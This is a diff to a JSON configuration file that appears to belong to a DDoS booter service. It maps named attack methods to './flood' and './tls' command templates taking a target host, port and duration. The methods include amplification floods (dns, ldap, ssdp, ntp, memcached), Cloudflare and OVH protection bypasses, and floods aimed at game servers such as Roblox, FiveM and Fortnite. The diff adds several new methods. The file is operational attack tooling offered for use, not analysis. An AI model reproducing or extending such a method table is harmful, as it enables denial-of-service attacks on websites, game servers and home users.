@@ -1,138 +1,41 @@
 [
-  {
-    "name": "dns",
-    "cmd": "./flood dns {host} {port} {time}"
-  },
-  {
-    "name": "udp",
-    "cmd": "./flood udp {host} {port} {time}"
-  },
-  {
-    "name": "ldap",
-    "cmd": "./flood ldap {host} {port} {time}"
-  },
-  {
-    "name": "ssdp",
-    "cmd": "./flood ssdp {host} {port} {time}"
-  },
-  {
-    "name": "home",
-    "cmd": "./flood home {host} {port} {time}"
-  },
-  {
-    "name": "udpbypass",
-    "cmd": "./flood udpbypass {host} {port} {time}"
-  },
-  {
-    "name": "tcp",
-    "cmd": "./flood tcp {host} {port} {time}"
-  },
-  {
-    "name": "socket",
-    "cmd": "./flood socket {host} {port} {time}"
-  },
-  {
-    "name": "ovh",
-    "cmd": "./flood ovh {host} {port} {time}"
-  },
-  {
-    "name": "tcpmix",
-    "cmd": "./flood tcpmix {host} {port} {time}"
-  },
-  {
-    "name": "tcpbypass",
-    "cmd": "./flood tcpbypass {host} {port} {time}"
-  },
-  {
-    "name": "ack",
-    "cmd": "./flood ack {host} {port} {time}"
-  },
-  {
-    "name": "game",
-    "cmd": "./flood game {host} {port} {time}"
-  },
-  {
-    "name": "rainbow",
-    "cmd": "./flood rainbow {host} {port} {time}"
-  },
-  {
-    "name": "rocket",
-    "cmd": "./flood rocket {host} {port} {time}"
-  },
-  {
-    "name": "roblox",
-    "cmd": "./flood roblox {host} {port} {time}"
-  },
-  {
-    "name": "fivem",
-    "cmd": "./flood fivem {host} {port} {time}"
-  },
-  {
-    "name": "pubg",
-    "cmd": "./flood pubg {host} {port} {time}"
-  },
-  {
-    "name": "fortnite",
-    "cmd": "./flood fortnite {host} {port} {time}"
-  },
-  {
-    "name": "warthunder",
-    "cmd": "./flood warthunder {host} {port} {time}"
-  },
-  {
-    "name": "counter",
-    "cmd": "./flood counter {host} {port} {time}"
-  },
-  {
-    "name": "samp",
-    "cmd": "./flood samp {host} {port} {time}"
-  },
-  {
-    "name": "subnet",
-    "cmd": "./flood subnet {host} {port} {time}"
-  },
-  {
-    "name": "icmp",
-    "cmd": "./flood icmp {host} {port} {time}"
-  },
-  {
-    "name": "http",
-    "cmd": "./tls {host} {time} 100"
-  },
-  {
-    "name": "https",
-    "cmd": "./tls {host} {time} 100"
-  },
-  {
-    "name": "httpx",
-    "cmd": "./tls {host} {time} 150"
-  },
-  {
-    "name": "rapidflood",
-    "cmd": "./tls {host} {time} 200"
-  },
-  {
-    "name": "tls",
-    "cmd": "./tls {host} {time} 100"
-  },
-  {
-    "name": "tlsx",
-    "cmd": "./tls {host} {time} 150"
-  },
-  {
-    "name": "bypass", 
-    "cmd": "./tls {host} {time} 100"
-  },
-  {
-    "name": "browser",
-    "cmd": "./tls {host} {time} 100"
-  },
-  {
-    "name": "cache",
-    "cmd": "./tls {host} {time} 100"
-  },
-  {
-    "name": "cloudflare",
-    "cmd": "./tls {host} {time} 100"
-  }
+  { "name": "dns",        "cmd": "./flood dns {host} {port} {time}" },
+  { "name": "udp",        "cmd": "./flood udp {host} {port} {time}" },
+  { "name": "ldap",       "cmd": "./flood ldap {host} {port} {time}" },
+  { "name": "ssdp",       "cmd": "./flood ssdp {host} {port} {time}" },
+  { "name": "ntp",        "cmd": "./flood ntp {host} {port} {time}" },
+  { "name": "memcached",  "cmd": "./flood memcached {host} {port} {time}" },
+  { "name": "home",       "cmd": "./flood home {host} {port} {time}" },
+  { "name": "udpbypass",  "cmd": "./flood udpbypass {host} {port} {time}" },
+  { "name": "tcp",        "cmd": "./flood tcp {host} {port} {time}" },
+  { "name": "socket",     "cmd": "./flood socket {host} {port} {time}" },
+  { "name": "slowloris",  "cmd": "./flood slowloris {host} {port} {time}" },
+  { "name": "ovh",        "cmd": "./flood ovh {host} {port} {time}" },
+  { "name": "tcpmix",     "cmd": "./flood tcpmix {host} {port} {time}" },
+  { "name": "tcpbypass",  "cmd": "./flood tcpbypass {host} {port} {time}" },
+  { "name": "ack",        "cmd": "./flood ack {host} {port} {time}" },
+  { "name": "game",       "cmd": "./flood game {host} {port} {time}" },
+  { "name": "rainbow",    "cmd": "./flood rainbow {host} {port} {time}" },
+  { "name": "rocket",     "cmd": "./flood rocket {host} {port} {time}" },
+  { "name": "roblox",     "cmd": "./flood roblox {host} {port} {time}" },
+  { "name": "fivem",      "cmd": "./flood fivem {host} {port} {time}" },
+  { "name": "pubg",       "cmd": "./flood pubg {host} {port} {time}" },
+  { "name": "fortnite",   "cmd": "./flood fortnite {host} {port} {time}" },
+  { "name": "warthunder", "cmd": "./flood warthunder {host} {port} {time}" },
+  { "name": "counter",    "cmd": "./flood counter {host} {port} {time}" },
+  { "name": "samp",       "cmd": "./flood samp {host} {port} {time}" },
+  { "name": "minecraft",  "cmd": "./flood minecraft {host} {port} {time}" },
+  { "name": "subnet",     "cmd": "./flood subnet {host} {port} {time}" },
+  { "name": "icmp",       "cmd": "./flood icmp {host} {port} {time}" },
+  { "name": "http",       "cmd": "./flood http {host} {port} {time}" },
+  { "name": "https",      "cmd": "./flood https {host} {port} {time}" },
+  { "name": "http2",      "cmd": "./flood http2 {host} {port} {time}" },
+  { "name": "httpx",      "cmd": "./flood httpx {host} {port} {time}" },
+  { "name": "browser",    "cmd": "./flood browser {host} {port} {time}" },
+  { "name": "rapidflood", "cmd": "./flood rapidflood {host} {port} {time}" },
+  { "name": "tls",        "cmd": "./flood tls {host} {port} {time}" },
+  { "name": "tlsx",       "cmd": "./flood tlsx {host} {port} {time}" },
+  { "name": "bypass",     "cmd": "./flood bypass {host} {port} {time}" },
+  { "name": "cache",      "cmd": "./flood cache {host} {port} {time}" },
+  { "name": "cloudflare", "cmd": "./flood cloudflare {host} {port} {time}" }
 ]
